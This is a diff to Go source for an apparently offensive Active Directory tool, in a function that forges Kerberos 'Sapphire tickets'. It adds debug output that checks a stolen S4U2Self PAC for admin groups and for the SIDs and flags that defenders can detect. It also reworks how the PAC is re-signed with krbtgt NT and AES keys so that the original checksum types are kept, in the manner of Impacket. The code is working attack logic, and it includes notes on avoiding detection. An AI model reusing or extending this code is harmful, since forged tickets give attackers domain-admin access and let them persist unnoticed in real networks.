@@ -336,23 +336,55 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	}
 	fmt.Printf("[+] Extracted PAC (%d bytes)\n", len(stolenPAC))
 
-	// DEBUG: Decode and show PAC groups to verify admin membership
+	// DEBUG: Decode and show PAC groups to verify admin membership and S4U2Self indicators
 	if decodedPAC, err := pac.DecodePAC(stolenPAC); err == nil {
-		fmt.Println("[DEBUG] PAC Group Analysis:")
+		fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
+		fmt.Println("║ [DEBUG] RAW S4U2Self PAC FROM KDC (before modification)                      ║")
+		fmt.Println("╠══════════════════════════════════════════════════════════════════════════════╣")
 		fmt.Printf("  User SID:       %s\n", decodedPAC.UserSID)
 		fmt.Printf("  Domain Admin:   %v\n", decodedPAC.IsDomainAdmin)
 		fmt.Printf("  Enterprise Admin: %v\n", decodedPAC.IsEnterpriseAdmin)
 		fmt.Printf("  Builtin Admin:  %v\n", decodedPAC.IsBuiltinAdmin)
+		fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
 		fmt.Printf("  Groups (%d):\n", len(decodedPAC.Groups))
 		for _, g := range decodedPAC.Groups {
 			fmt.Printf("    - %s\n", g)
 		}
 		if len(decodedPAC.ExtraSIDs) > 0 {
+			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
 			fmt.Printf("  Extra SIDs (%d):\n", len(decodedPAC.ExtraSIDs))
 			for _, s := range decodedPAC.ExtraSIDs {
-				fmt.Printf("    - %s\n", s)
+				label := ""
+				if s == "S-1-18-1" {
+					label = " ← AUTHENTICATION AUTHORITY (normal AS-REQ)"
+				} else if s == "S-1-18-2" {
+					label = " ← SERVICE ASSERTED (S4U2Self!) ⚠️"
+				}
+				fmt.Printf("    - %s%s\n", s, label)
 			}
 		}
+		fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
+		fmt.Println("  S4U2Self DETECTION ANALYSIS:")
+
+		// Show UserFlags
+		fmt.Printf("    UserFlags: 0x%X (%d)\n", decodedPAC.UserFlags, decodedPAC.UserFlags)
+		if decodedPAC.UserFlags&0x20 != 0 {
+			fmt.Println("      ✓ LOGON_EXTRA_SIDS (0x20) - Has extra SIDs")
+		}
+		if decodedPAC.UserFlags&0x200 != 0 {
+			fmt.Println("      ⚠️  LOGON_RESOURCE_GROUPS (0x200) - S4U2Self adds this! ⚠️")
+		}
+
+		// Show S-1-18-x analysis
+		if decodedPAC.HasServiceAssertedIdentity {
+			fmt.Println("    ⚠️  S-1-18-2 PRESENT - This PAC was obtained via S4U2Self!")
+			fmt.Println("    ⚠️  This is a DETECTION VECTOR - KDC watermarks S4U2Self tickets!")
+		} else if decodedPAC.HasAuthAssertedIdentity {
+			fmt.Println("    ✓  S-1-18-1 present - Normal authentication authority")
+		} else {
+			fmt.Println("    ?  Neither S-1-18-1 nor S-1-18-2 found (parser may have missed it)")
+		}
+		fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
 	} else {
 		fmt.Printf("[DEBUG] Failed to decode PAC for analysis: %v\n", err)
 	}
@@ -384,16 +416,35 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	}
 	fmt.Printf("[+] TGT decrypted (%d bytes)\n", len(decryptedTGTBytes))
 
-	// Step 5: Re-sign PAC with krbtgt key
+	// Step 5: Re-sign PAC with krbtgt keys (preserving original checksum types)
 	// EDUCATIONAL: The PAC was originally signed with S4U2Self session key.
 	// We must re-sign it with the krbtgt key for it to be valid in the TGT.
-	fmt.Println("[*] Step 5: Re-signing PAC with krbtgt key...")
+	// Unlike the old approach, we now PRESERVE the original checksum types
+	// and use the appropriate key for each (NTLM for RC4, AES for AES).
+	fmt.Println("[*] Step 5: Re-signing PAC with krbtgt keys...")
 	pac.DebugPAC(stolenPAC) // Debug before re-signing
-	resignedPAC, err := pac.ResignPAC(stolenPAC, krbtgtKey, krbtgtEtype)
-	if err != nil {
-		return nil, fmt.Errorf("failed to re-sign PAC: %w", err)
+
+	// Use the new function that preserves checksum types (like Impacket)
+	var resignedPAC []byte
+	if len(req.KrbtgtNTHash) == 16 || len(req.KrbtgtAES256) == 32 {
+		// Use the Impacket-compatible re-signing with both keys when available
+		resignedPAC, err = pac.ResignPACWithKeys(stolenPAC, req.KrbtgtNTHash, req.KrbtgtAES256)
+		if err != nil {
+			// Fall back to single-key signing if the PAC doesn't need both
+			fmt.Printf("[!] ResignPACWithKeys failed (%v), falling back to single key\n", err)
+			resignedPAC, err = pac.ResignPAC(stolenPAC, krbtgtKey, krbtgtEtype)
+			if err != nil {
+				return nil, fmt.Errorf("failed to re-sign PAC: %w", err)
+			}
+		}
+	} else {
+		// Single key only
+		resignedPAC, err = pac.ResignPAC(stolenPAC, krbtgtKey, krbtgtEtype)
+		if err != nil {
+			return nil, fmt.Errorf("failed to re-sign PAC: %w", err)
+		}
 	}
-	fmt.Printf("[+] PAC re-signed with krbtgt key (etype=%d)\n", krbtgtEtype)
+	fmt.Printf("[+] PAC re-signed with krbtgt key(s)\n")
 	pac.DebugPAC(resignedPAC) // Debug after re-signing
 
 	// Step 6: Replace PAC in TGT
